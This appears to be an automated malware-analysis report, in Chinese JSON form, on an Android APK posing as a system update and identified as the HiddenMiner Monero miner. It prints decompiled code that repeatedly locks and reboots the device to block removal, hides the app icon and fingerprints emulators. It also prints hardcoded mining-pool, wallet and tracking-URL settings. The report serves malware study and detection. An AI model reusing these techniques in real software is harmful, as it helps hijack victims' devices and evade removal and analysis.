@@ -1,0 +1,217 @@
+{
+  "APK信息": {
+    "文件名": "6fb8cb3fb549c3531cc5661f6ec5d30c628cba6b1b72719be10823d85cae16e4.apk",
+    "sha256": "6fb8cb3fb549c3531cc5661f6ec5d30c628cba6b1b72719be10823d85cae16e4",
+    "包名": "com.android.sesupdate",
+    "应用名": "",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 792.3
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\sesupdate\\receivers\\DeviceAdmin;",
+          "method_signature": "if(dpm.isAdminActive(new ComponentName(context, (Class<?>)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public String onDisableRequested(final Context context, Intent intent) {\n    handler.postDelayed(new Runnable() {\n        public void run() {\n            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n            if (dpm.isAdminActive(new ComponentName(context, DeviceAdmin.class))) {\n                context.startService(new Intent(context, DisableService.class));\n                dpm.lockNow();\n                for (int i = 1; i <= 20; i++) {\n                    step1.postDelayed(new Runnable() {\n                        public void run() {\n                            dpm.lockNow();\n                        }\n                    }, i * 250);\n                }\n            }\n        }\n    }, ...);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.admin.DeviceAdminReceiver\n>>>     public String onDisableRequested(final Context context, Intent intent) {\n>>>         Handler handler = new Handler();\n>>>         handler.postDelayed(new Runnable() { // from class: com.android.sesupdate.receivers.DeviceAdmin.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                 if (dpm.isAdminActive(new ComponentName(context, (Class<?>) DeviceAdmin.class))) {\n>>>                     context.startService(new Intent(context, (Class<?>) DisableService.class));\n>>>                     dpm.lockNow();\n>>>                     for (int i = 1; i <= 20; i++) {\n>>>                         Handler step1 = new Handler();\n>>>                         step1.postDelayed(new Runnable() { // from class: com.android.sesupdate.receivers.DeviceAdmin.1.1\n>>>                             @Override // java.lang.Runnable\n>>>                             public void run() {\n>>>                                 dpm.lockNow();\n>>>                             }\n>>>                         }, i * 250);\n>>>                     }\n                      if (Build.VERSION.SDK_INT >= 24) {\n                          dpm.reboot(new ComponentName(context, (Class<?>) DeviceAdmin.class));\n                      }",
+          "behavior_description": "该代码重写DeviceAdminReceiver的onDisableRequested回调，在用户尝试取消设备管理员权限（卸载/停用恶意应用的必经步骤）时被系统触发。代码首先启动DisableService服务，随后立即调用dpm.lockNow()锁定屏幕，并通过Handler以250ms为步长（i*250ms，最长5秒）再调度20次lockNow()，反复锁屏将用户踢回锁屏界面，阻止用户进入设置页面完成取消管理员操作，实现防卸载与设备锁定勒索效果。数据流向：DevicePolicyManager系统服务→isAdminActive()检测管理员激活状态→lockNow()反复强制锁屏（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\sesupdate\\GlobalData;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public class GlobalData {\n    public static PowerManager.WakeLock wakeLock;\n}",
+          "malicious_code_snippet_context": "  import android.os.PowerManager;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class GlobalData {\n>>>     public static PowerManager.WakeLock wakeLock;\n>>> }",
+          "behavior_description": "该代码在伪装成系统更新组件（com.android.sesupdate）的 GlobalData 类中声明了一个静态全局的 PowerManager.WakeLock 字段，作为跨组件共享的唤醒锁持有入口。数据流向：PowerManager.WakeLock（静态全局字段，供 Service/BroadcastReceiver 等其他组件赋值）→ wakeLock.acquire() 后长期阻止 CPU 休眠，使恶意服务在屏幕关闭后仍持续运行，实现保活/持久化。注意：本片段仅是字段声明，未包含 newWakeLock()/acquire() 的实际调用，也未出现 BOOT_COMPLETED 接收器、START_STICKY、AlarmManager 周期唤醒等真正的持久化实现，属于保活机制的辅助结构，需结合引用该字段的 Service 代码才能确认完整持久化链路。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_debug",
+          "中文名": "反调试",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "isDebuggerConnected"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish",
+              "ro.kernel.qemu"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\framgia\\android\\emulator\\EmulatorDetector;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static final String[] PHONE_NUMBERS = {\"15555215554\", \"15555215556\", \"15555215558\", ...};\nprivate static final String[] DEVICE_IDS = {\"000000000000000\", \"e21833235b6eef10\", \"012345678912345\"};\nprivate static final String[] IMSI_IDS = {\"310260000000000\"};\nprivate static final String[] QEMU_DRIVERS = {\"goldfish\"};\nprivate static final String[] PIPES = {\"/dev/socket/qemud\", \"/dev/qemu_pipe\"};\nprivate static final String[] GENY_FILES = {\"/dev/socket/genyd\", \"/dev/socket/baseband_genyd\"};\nprivate static final String[] X86_FILES = {\"ueventd.android_x86.rc\", \"x86.prop\", \"fstab.vbox86\", \"init.vbox86.rc\", ...};\nprivate static final Property[] PROPERTIES = {new Property(\"init.svc.qemud\", null), new Property(\"ro.kernel.qemu\", \"1\"), new Property(\"ro.hardware\", \"goldfish\"), new Property(\"ro.product.device\", \"generic\"), new Property(\"ro.serialno\", null), ...};",
+          "malicious_code_snippet_context": "      @SuppressLint({\"StaticFieldLeak\"})\n      private static EmulatorDetector mEmulatorDetector;\n      private final Context mContext;\n>>>     private static final String[] PHONE_NUMBERS = {\"15555215554\", \"15555215556\", \"15555215558\", \"15555215560\", \"15555215562\", \"15555215564\", \"15555215566\", \"15555215568\", \"15555215570\", \"15555215572\", \"15555215574\", \"15555215576\", \"15555215578\", \"15555215580\", \"15555215582\", \"15555215584\"};\n>>>     private static final String[] DEVICE_IDS = {\"000000000000000\", \"e21833235b6eef10\", \"012345678912345\"};\n>>>     private static final String[] IMSI_IDS = {\"310260000000000\"};\n>>>     private static final String[] GENY_FILES = {\"/dev/socket/genyd\", \"/dev/socket/baseband_genyd\"};\n>>>     private static final String[] QEMU_DRIVERS = {\"goldfish\"};\n>>>     private static final String[] PIPES = {\"/dev/socket/qemud\", \"/dev/qemu_pipe\"};\n>>>     private static final String[] X86_FILES = {\"ueventd.android_x86.rc\", \"x86.prop\", \"ueventd.ttVM_x86.rc\", \"init.ttVM_x86.rc\", \"fstab.ttVM_x86\", \"fstab.vbox86\", \"init.vbox86.rc\", \"ueventd.vbox86.rc\"};\n>>>     private static final String[] ANDY_FILES = {\"fstab.andy\", \"ueventd.andy.rc\"};\n      private static final String[] NOX_FILES = {\"fstab.nox\", \"init.nox.rc\", \"ueventd.nox.rc\"};\n      private static final Property[] PROPERTIES = {new Property(\"init.svc.qemud\", null), new Property(\"init.svc.qemu-props\", null), new Property(\"qemu.hw.mainkeys\", null), new Property(\"qemu.sf.fake_camera\", null), new Property(\"qemu.sf.lcd",
+          "behavior_description": "该代码为模拟器环境检测模块，通过多维度指纹识别当前运行环境是否为Android模拟器/分析沙箱：1) 读取设备ID、IMSI、手机号并与已知模拟器默认值（AVD默认号码15555215554、默认设备ID 000000000000000、IMSI 310260000000000）比对；2) 探测goldfish QEMU驱动、/dev/qemu_pipe、/dev/socket/qemud等QEMU管道文件，以及Genymotion、Andy、Nox、x86/vBox等模拟器特征文件；3) 读取init.svc.qemud、ro.kernel.qemu=1、ro.hardware=goldfish等系统属性。数据流向：设备标识符/系统属性/文件系统特征（source）→ 与内置模拟器指纹库逐一比对 → 输出是否运行于模拟器的判定结果（sink）。在已确认恶意的HiddenMiner挖矿木马样本中，该检测用于识别安全分析沙箱环境并规避检测，使挖矿等恶意载荷仅在真实设备上激活执行，属于典型的反检测规避技术。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\sesupdate\\receivers\\DeviceAdmin;",
+          "method_signature": "hideAppIcon(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void hideAppIcon(Context context) {\n    PackageManager p = context.getPackageManager();\n    ComponentName componentName = new ComponentName(context, MainActivity.class);\n    p.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          super.onDisabled(context, intent);\n      }\n  \n>>>     public void hideAppIcon(Context context) {\n>>>         PackageManager p = context.getPackageManager();\n>>>         ComponentName componentName = new ComponentName(context, (Class<?>) MainActivity.class);\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n>>>     }\n  }",
+          "behavior_description": "该代码位于 DeviceAdminReceiver 子类中，通过 PackageManager.setComponentEnabledSetting() 将应用的启动页组件 MainActivity 设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED，参数1 = DONT_KILL_APP），导致应用图标从桌面启动器中消失，用户无法察觉应用存在，也难以直接卸载。该样本伪装成 Play Store 更新应用（com.android.sesupdate），与厂商报告中的 Android/HiddenMiner 行为吻合：安装后隐藏图标以便在后台静默挖矿（Monero）。数据流向：MainActivity 启动组件 → setComponentEnabledSetting() 禁用组件 → 应用图标从 Launcher 隐藏，实现隐蔽驻留。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\sesupdate\\receivers\\DeviceAdmin;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 24)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "for (int i = 1; i <= 20; i++) {\n    Handler step1 = new Handler();\n    step1.postDelayed(new Runnable() {\n        public void run() {\n            dpm.lockNow();\n        }\n    }, i * 250);\n}\nif (Build.VERSION.SDK_INT >= 24) {\n    dpm.reboot(new ComponentName(context, (Class<?>) DeviceAdmin.class));\n}",
+          "malicious_code_snippet_context": "                  if (dpm.isAdminActive(new ComponentName(context, (Class<?>) DeviceAdmin.class))) {\n                      context.startService(new Intent(context, (Class<?>) DisableService.class));\n                      dpm.lockNow();\n>>>                     for (int i = 1; i <= 20; i++) {\n>>>                         Handler step1 = new Handler();\n>>>                         step1.postDelayed(new Runnable() { // from class: com.android.sesupdate.receivers.DeviceAdmin.1.1\n>>>                             @Override // java.lang.Runnable\n>>>                             public void run() {\n>>>                                 dpm.lockNow();\n>>>                             }\n>>>                         }, i * 250);\n>>>                     }\n>>>                     if (Build.VERSION.SDK_INT >= 24) {\n>>>                         dpm.reboot(new ComponentName(context, (Class<?>) DeviceAdmin.class));\n                      }\n                  }\n              }",
+          "behavior_description": "该代码位于DeviceAdminReceiver的onDisableRequested回调中，当用户尝试取消设备管理员权限时被触发：恶意软件先通过Handler以250毫秒为间隔循环调用dpm.lockNow()共20次，反复强制锁屏干扰用户完成禁用操作；随后在Android 7.0（API 24）及以上版本调用dpm.reboot()强制重启设备，使用户无法成功移除恶意设备管理员权限，属于典型的防卸载/保活对抗行为（与HiddenMiner伪装系统更新应用的恶意家族特征一致）。数据流向：用户尝试禁用设备管理员的事件(source)→DevicePolicyManager.lockNow()反复锁屏 + DevicePolicyManager.reboot()强制重启(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "49Bq2bFsvJFAe11SgAZQZjZRn6rE2CXHz4tkoomgx4pZhkJVSUmUHT4ixRWdGX8z2cgJeftiyTEK1U1DW7mEZS8E4dF5hkn"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\sesupdate\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static String miningPool = \"sg1.supportxmr.com\";\npublic static int miningPort = 3333;\npublic static String miningUser = \"49Bq2bFsvJFAe11SgAZQZjZRn6rE2CXHz4tkoomgx4pZhkJVSUmUHT4ixRWdGX8z2cgJeftiyTEK1U1DW7mEZS8E4dF5hkn\";",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Constants {\n      public static String trackingUrl = \"http://debujxe.com/click.php?cnv_id=\";\n>>>     public static String miningPool = \"sg1.supportxmr.com\";\n>>>     public static int miningPort = 3333;\n>>>     public static String miningUser = \"49Bq2bFsvJFAe11SgAZQZjZRn6rE2CXHz4tkoomgx4pZhkJVSUmUHT4ixRWdGX8z2cgJeftiyTEK1U1DW7mEZS8E4dF5hkn\";\n      public static int threadsPriority = 1;\n  }",
+          "behavior_description": "该Constants类是HiddenMiner挖矿木马（伪装成Play Store更新应用sesupdate）的核心配置类。代码中硬编码了一个Monero钱包地址（49开头，95字符）作为挖矿账户名，并配置了矿池地址sg1.supportxmr.com及端口3333。数据流向：硬编码的钱包地址与矿池配置常量 → 被后台挖矿模块读取，用于建立与Stratum矿池的连接并以该钱包地址提交算力，在受害者设备上隐蔽挖掘Monero，全部算力收益转入攻击者钱包。需注意：此处检测到的钱包地址并非采集受害者的钱包，而是攻击者自己的收款钱包，实际行为是隐蔽挖矿牟利；此外类中还包含可疑追踪URL（http://debujxe.com/click.php?cnv_id=），进一步印证其恶意性质。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
